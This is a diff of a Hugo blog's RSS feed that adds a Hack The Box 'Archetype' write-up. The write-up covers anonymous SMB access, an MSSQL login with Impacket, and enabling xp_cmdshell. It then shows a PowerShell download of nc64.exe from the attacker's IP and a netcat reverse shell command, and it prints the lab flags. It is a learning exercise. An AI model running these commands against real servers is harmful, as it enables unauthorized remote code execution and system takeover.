@@ -2,19 +2,213 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
     <title>Wook&#39;s blog</title>
-    <link>http://localhost:1313/</link>
+    <link>http://localhost:49865/</link>
     <description>Recent content on Wook&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
     <managingEditor>leewookb@gmail.com (Wook Lee)</managingEditor>
     <webMaster>leewookb@gmail.com (Wook Lee)</webMaster>
-    <lastBuildDate>Fri, 26 Jul 2024 00:00:00 +0000</lastBuildDate>
-    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 27 Jul 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:49865/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>[HTB] Archetype</title>
+      <link>http://localhost:49865/htb-archetype/</link>
+      <pubDate>Sat, 27 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:49865/htb-archetype/</guid>
+      <description>This was the first box in Tier 2 of the Starting Point. However, I am pretty sure these boxes are not starter boxes because this one was super hard and I honestly would have not finished it without the walkthrough. Since I couldn&amp;rsquo;t finish this box myself, there are going to be some missing points here and there throughout this post. I think it&amp;rsquo;s time for me to start working on the easy boxes from here and maybe come back to the tier 2 boxes later after some time.</description>
+      <content:encoded><![CDATA[<div style="text-align: center"><img src="./giphy.gif"></div>
+<p>This was the first box in <code>Tier 2</code> of the Starting Point. However, I am pretty sure these boxes are not starter boxes because this one was super hard and I honestly would have not finished it without the walkthrough. Since I couldn&rsquo;t finish this box myself, there are going to be some missing points here and there throughout this post. I think it&rsquo;s time for me to start working on the easy boxes from here and maybe come back to the tier 2 boxes later after some time. If I can solve one of those in the future, I will be happy to death and feel so much pride in myself. I believe the day will come very soon.</p>
+<hr>
+<h4 id="which-tcp-port-is-hosting-a-databse-server">Which TCP port is hosting a databse server?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>1433</code></pre>
+<p><img src="image.png#center" alt="alt text"></p>
+<br>
+<h4 id="what-is-the-name-of-the-non-administrative-share-available-over-smb">What is the name of the non-Administrative share available over SMB?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>backups</code></pre>
+<p><img src="image-1.png#center" alt="alt text"></p>
+<br>
+<p>What is the password identified in the file on the SMB share?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>M3g4c0rp123</code></pre>
+<p>After I figured there was a non-administrative share called backups, I tried to connect to the share by running the following command:</p>
+<p><code>smblcient -N \\\\10.129.95.187\\backups</code></p>
+<p>The <code>-N</code> option is short for &lsquo;No Password&rsquo;</p>
+<p><img src="image-2.png#center" alt="alt text"></p>
+<p>On the left tmux pane, I was able to connect to the <code>backups</code> share of the SMB server and download the only file <code>prod.dtsConfig</code> using the <code>get</code> command. On the right tmux pane, I opened up the downloaded file and was able to find the password inside.</p>
+<br>
+<h4 id="what-script-from-impacket-collection-can-be-used-in-order-to-establish-an-authenticated-connection-to-a-microsoft-sql-server">What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>mssqlclient.py</code></pre>
+<p><img src="image-3.png#center" alt="alt text"></p>
+<p><strong><em>But What is Impacket?</em></strong></p>
+<p>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.</p>
+<br>
+<p>We can try to connect to the MSSQL server by using impacket&rsquo;s <code>mssqlclient.py</code> script along with the following flags:
+<code>python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth</code></p>
+<p><code>-windows-auth</code>: this flag is specified to use Windows Authentication</p>
+<p>Successfully authenticated to the Microsoft SQL Server</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/impacket/examples<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Impacket v0.12.0.dev1+20240725.125704.9f36a10e - Copyright <span style="color:#fab387">2023</span> Fortra
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Password:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Encryption required, switching to TLS
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> ENVCHANGE<span style="color:#89dceb;font-weight:bold">(</span>DATABASE<span style="color:#89dceb;font-weight:bold">)</span>: Old Value: master, New Value: master
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> ENVCHANGE<span style="color:#89dceb;font-weight:bold">(</span>LANGUAGE<span style="color:#89dceb;font-weight:bold">)</span>: Old Value: , New Value: us_english
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> ENVCHANGE<span style="color:#89dceb;font-weight:bold">(</span>PACKETSIZE<span style="color:#89dceb;font-weight:bold">)</span>: Old Value: 4096, New Value: <span style="color:#fab387">16192</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> INFO<span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89dceb;font-weight:bold">)</span>: Line 1: Changed database context to <span style="color:#a6e3a1">&#39;master&#39;</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> INFO<span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89dceb;font-weight:bold">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> ACK: Result: <span style="color:#fab387">1</span> - Microsoft SQL Server <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">140</span> 3232<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>!<span style="color:#89dceb;font-weight:bold">]</span> Press <span style="color:#89dceb">help</span> <span style="color:#cba6f7">for</span> extra shell commands
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt;</span></span></code></pre></div>
+<br>
+<h4 id="what-extended-stored-procedure-of-microsoft-sql-server-can-be-used-in-order-to-spawn-a-windows-command-shell">What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>xp_cmdshell</code></pre>
+<p><img src="image-4.png#center" alt="alt text"></p>
+<br>
+<h4 id="what-script-can-be-used-in-order-to-search-possible-paths-to-escalate-privileges-on-windows-hosts">What script can be used in order to search possible paths to escalate privileges on Windows hosts?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>winPEAS</code></pre>
+<p>The cheatsheet from pentestmonkey is really helpful that I found how to set up the command execution through the <code>xp_cmdshell</code>.
+<img src="image-5.png#center" alt="alt text"></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; EXEC xp_cmdshell <span style="color:#a6e3a1">&#39;net user&#39;</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>ERROR: Line 1: SQL Server blocked access to procedure <span style="color:#a6e3a1">&#39;sys.xp_cmdshell&#39;</span> of component <span style="color:#a6e3a1">&#39;xp_cmdshell&#39;</span> because this component is turned off as part of the secur
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>ity configuration <span style="color:#cba6f7">for</span> this server. A system administrator can <span style="color:#89dceb">enable</span> the use of <span style="color:#a6e3a1">&#39;xp_cmdshell&#39;</span> by using sp_configure. For more information about enabling <span style="color:#a6e3a1">&#39;xp
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#a6e3a1">_cmdshell&#39;</span>, search <span style="color:#cba6f7">for</span> <span style="color:#a6e3a1">&#39;xp_cmdshell&#39;</span> in SQL Server Books Online.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; EXEC sp_configure <span style="color:#a6e3a1">&#39;show advanced options&#39;</span>, 1;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> INFO<span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89dceb;font-weight:bold">)</span>: Line 185: Configuration option <span style="color:#a6e3a1">&#39;show advanced options&#39;</span> changed from <span style="color:#fab387">0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; RECONFIGURE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; EXEC sp_configure <span style="color:#a6e3a1">&#39;xp_cmdshell&#39;</span>, 1;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> INFO<span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89dceb;font-weight:bold">)</span>: Line 185: Configuration option <span style="color:#a6e3a1">&#39;xp_cmdshell&#39;</span> changed from <span style="color:#fab387">0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; RECONFIGURE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; sp_configure;</span></span></code></pre></div>
+<p>Now I managed to get a command execution. Let&rsquo;s get a stable reverse shell. We will upload the <code>nc64.exe</code> binary to the target machine and execute an interactive <code>cmd.exe</code> process on our listening port.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; xp_cmdshell <span style="color:#a6e3a1">&#34;whoami&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>output
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>-----------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>archetype<span style="color:#89b4fa">\s</span>ql_svc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>NULL</span></span></code></pre></div>
+<p>Let&rsquo;s download the binary and navigate to the oflder and then start the simple HTTP sever, then the netcat listener in a different tab.</p>
+<p><code>python3 -m http.server 80</code>
+<code>nc -lvnp 443</code></p>
+<br>
+<p>As a user <code>archetype\sql_svc</code>, we don&rsquo;t have enough privileges to upload files in a system directory and only user <code>Administrator</code> can perform actions with higher privileges. We need to change the current working directory somewhere in the home directory of our user where it will be possible to write.</p>
+<p><code>SQL&gt; xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.14/nc64.exe -outfile nc64.exe</code></p>
+<p><img src="image-6.png#center" alt="alt text"></p>
+<p>it was confirmed that the target machine indeed performed the request. Let&rsquo;s bind the <code>cmd.exe</code> through the <code>nc</code> to our listener.</p>
+<p><code>SQL&gt; xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.14 443&quot;</code></p>
+<p><img src="image-7.png#center" alt="alt text"></p>
+<p>on the right tmux pane, I was able to capture the reverse shell through the netcat.</p>
+<br>
+<h4 id="what-file-contains-the-administrators-password">What file contains the administrator&rsquo;s password?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>ConsoleHost_history.txt</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span> Directory of C:<span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\s</span>ql_svc<span style="color:#89b4fa">\D</span>esktop
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>01/20/2020  06:42 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>01/20/2020  06:42 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>02/25/2020  07:37 AM                <span style="color:#fab387">32</span> user.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>               <span style="color:#fab387">1</span> File<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>             <span style="color:#fab387">32</span> bytes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>               <span style="color:#fab387">2</span> Dir<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>  10,716,418,048 bytes free
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>C:<span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\s</span>ql_svc<span style="color:#89b4fa">\D</span>esktop&gt;type user.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb">type</span> user.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>3e7b102e78218e935bf3f4951fec21a3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>C:<span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\s</span>ql_svc<span style="color:#89b4fa">\D</span>esktop&gt;</span></span></code></pre></div>
+<p>On the target machine, I used powershell to download the program from my system.
+<img src="image-8.png#center" alt="alt text"></p>
+<p><img src="image-9.png#center" alt="alt text"></p>
+<br>
+<h4 id="submit-user-flag">Submit user flag</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>3e7b102e78218e935bf3f4951fec21a3</code></pre>
+<p><img src="image-10.png#center" alt="alt text"></p>
+<br>
+<h4 id="submit-root-flag">Submit root flag</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>b91ccec3305e98240082d4474b848528</code></pre>
+<br>
+<p><img src="image-11.png#center" alt="alt text"></p>
+]]></content:encoded>
+    </item>
     <item>
       <title>[HTB] Tactics</title>
-      <link>http://localhost:1313/htb-tactics/</link>
+      <link>http://localhost:49865/htb-tactics/</link>
       <pubDate>Fri, 26 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-tactics/</guid>
+      <guid>http://localhost:49865/htb-tactics/</guid>
       <description>Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall? -Pn By default, when nmap performs host discovery, it
 sends an ICMP ping. checks if port 80 is open checks if port 443 is open. If any of these three conditions are met, nmap considers the host to be up.
 However, in many real-world scenarios, ICMP is often blocked, and ports 80 and 443 are closed.</description>
@@ -212,9 +406,9 @@ pip3 install -r requirements.txt</code></pre>
     </item>
     <item>
       <title>[THM] Blue</title>
-      <link>http://localhost:1313/thm-blue/</link>
+      <link>http://localhost:49865/thm-blue/</link>
       <pubDate>Thu, 25 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/thm-blue/</guid>
+      <guid>http://localhost:49865/thm-blue/</guid>
       <description>How many ports are open with a port number under 1000? 3 1┌──(kali㉿kali)-[~/Desktop] 2└─$ nmap -sC -sV 10.10.75.102 --min-rate 3000 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 12:11 EDT 4Nmap scan report for 10.10.75.102 5Host is up (0.093s latency). 6Not shown: 65526 closed tcp ports (conn-refused) 7PORT STATE SERVICE VERSION 8135/tcp open msrpc Microsoft Windows RPC 9139/tcp open netbios-ssn Microsoft Windows netbios-ssn 10445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 113389/tcp open ssl/ms-wbt-server?</description>
       <content:encoded><![CDATA[<h4 id="how-many-ports-are-open-with-a-port-number-under-1000">How many ports are open with a port number under 1000?</h4>
 
@@ -433,9 +627,9 @@ pip3 install -r requirements.txt</code></pre>
     </item>
     <item>
       <title>[HTB] Pennyworth</title>
-      <link>http://localhost:1313/htb-pennyworth/</link>
+      <link>http://localhost:49865/htb-pennyworth/</link>
       <pubDate>Sun, 21 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-pennyworth/</guid>
+      <guid>http://localhost:49865/htb-pennyworth/</guid>
       <description>This box was easier compared to the previous two I attempted. However, I still referred to the provided walkthrough. I am trying to apply a top-down approach to my learning as a mentor advised me to. I feel too dependent on resources because I am not confident in my skills yet and have always relied on guided learning. I admit there is not shortcut; trial and error will benefit me in the long run.</description>
       <content:encoded><![CDATA[<div style="text-align: center"><img src="./giphy.gif"></div>
 <p>This box was easier compared to the previous two I attempted. However, I still referred to the provided walkthrough. I am trying to apply a <code>top-down</code> approach to my learning as a mentor advised me to. I feel too dependent on resources because I am not confident in my skills yet and have always relied on guided learning. I admit there is not shortcut; <code>trial and error</code> will benefit me in the long run.</p>
@@ -549,9 +743,9 @@ pip3 install -r requirements.txt</code></pre>
     </item>
     <item>
       <title>[HTB] Funnel</title>
-      <link>http://localhost:1313/htb-funnel/</link>
+      <link>http://localhost:49865/htb-funnel/</link>
       <pubDate>Thu, 18 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-funnel/</guid>
+      <guid>http://localhost:49865/htb-funnel/</guid>
       <description>How many TCP ports are open? 2 According to output of the nmap scan, there are 2 open ports.
 What is the name of the directory that is available on the FTP server? mail_backup 1PORT STATE SERVICE VERSION 221/tcp open ftp vsftpd 3.0.3 3| ftp-anon: Anonymous FTP login allowed (FTP code 230) 4|_drwxr-xr-x 2 ftp ftp 4096 Nov 28 2022 mail_backup What is the default account password that every new member on the &amp;ldquo;Funnel&amp;rdquo; team should change as soon as possible?</description>
       <content:encoded><![CDATA[<h4 id="how-many-tcp-ports-are-open">How many TCP ports are open?</h4>
@@ -757,9 +951,9 @@ What is the name of the directory that is available on the FTP server? mail_back
     </item>
     <item>
       <title>[HTB] Bike</title>
-      <link>http://localhost:1313/htb-bike/</link>
+      <link>http://localhost:49865/htb-bike/</link>
       <pubDate>Wed, 17 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-bike/</guid>
+      <guid>http://localhost:49865/htb-bike/</guid>
       <description>This box was really tough to pwn. I am 100% sure I wouldn&amp;rsquo;t have been able to clear it on my own without the provided walkthrough documents. I understand every step from the enumeration phase to the exploit, but I think I lack the knowledge to connect the dots between enumeration and exploits. This is also my first time encountering the Template Engine and SSTI Vulnerability. I know it takes time, and I have improved a lot over the past month.</description>
       <content:encoded><![CDATA[<p>This box was really tough to pwn. I am 100% sure I wouldn&rsquo;t have been able to clear it on my own without the provided walkthrough documents. I understand every step from the enumeration phase to the exploit, but I think I lack the knowledge to connect the dots between enumeration and exploits. This is also my first time encountering the <code>Template Engine</code> and <code>SSTI Vulnerability</code>. I know it takes time, and I have improved a lot over the past month. I am trying not to hurry my learning because impatience has negatively impacted me several times in my life. I really do not want that to happen again. Let&rsquo;s take it slow.</p>
 <hr>
@@ -1021,9 +1215,9 @@ ${{7*7}}
     </item>
     <item>
       <title>[THM] Active Directory</title>
-      <link>http://localhost:1313/thm-active-directory/</link>
+      <link>http://localhost:49865/thm-active-directory/</link>
       <pubDate>Tue, 16 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/thm-active-directory/</guid>
+      <guid>http://localhost:49865/thm-active-directory/</guid>
       <description>Microsoft&amp;rsquo;s Active Directory is the backbone of the corporate world. It simplifies the management of devices and users within a corporate environment.
 Windows domain is a group of users and computers under the administration of a given business. The main idea behind a domain is to centralize the administration of common components of a Windows computer network in a sigle repository called Active Directory. The server that runs the Active Directory service is known as a Domain Controller (DC).</description>
       <content:encoded><![CDATA[<p>Microsoft&rsquo;s <strong><em>Active Directory</em></strong> is the backbone of the corporate world. It simplifies the management of devices and users within a corporate environment.</p>
@@ -1235,9 +1429,9 @@ TGS are tickets that allow connection only to the specific service they were cre
     </item>
     <item>
       <title>[HTB] Ignition</title>
-      <link>http://localhost:1313/htb-ignition/</link>
+      <link>http://localhost:49865/htb-ignition/</link>
       <pubDate>Mon, 15 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-ignition/</guid>
+      <guid>http://localhost:49865/htb-ignition/</guid>
       <description>Which service version is found to be running on port 80? nginx 1.14.2 What is the 3-digit HTTP status code returned when you visit http://{machine IP}/? 302 curl -v http://10.129.98.187
 What is the virtual host name the webpage expects to be accessed by? ignition.htb What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs? /etc/hosts the ignition.</description>
       <content:encoded><![CDATA[<h4 id="which-service-version-is-found-to-be-running-on-port-80">Which service version is found to be running on port 80?</h4>
@@ -1327,9 +1521,9 @@ What is the virtual host name the webpage expects to be accessed by? ignition.ht
     </item>
     <item>
       <title>[TIL] Key Exchange</title>
-      <link>http://localhost:1313/til-key-exchange/</link>
+      <link>http://localhost:49865/til-key-exchange/</link>
       <pubDate>Mon, 15 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/til-key-exchange/</guid>
+      <guid>http://localhost:49865/til-key-exchange/</guid>
       <description>What is a Key Exchange? A key exchange is a method used in cryptography to securely exchange cryptographic keys between two parties. These keys are then used to encrypt and decrypt messages, ensuring that the communication remains private and secure. The primary challenge in key exchange is to do this securely over an insecure communication channel, such as the internet.
 What is Diffie-Hellman Key Exchange? The Diffie-Hellman key exchange is one of the earliest and most widely used methods for securely exchanging cryptographic keys.</description>
       <content:encoded><![CDATA[<h4 id="what-is-a-key-exchange">What is a Key Exchange?</h4>
@@ -1353,9 +1547,9 @@ What is Diffie-Hellman Key Exchange? The Diffie-Hellman key exchange is one of t
     </item>
     <item>
       <title>[HTB] Three</title>
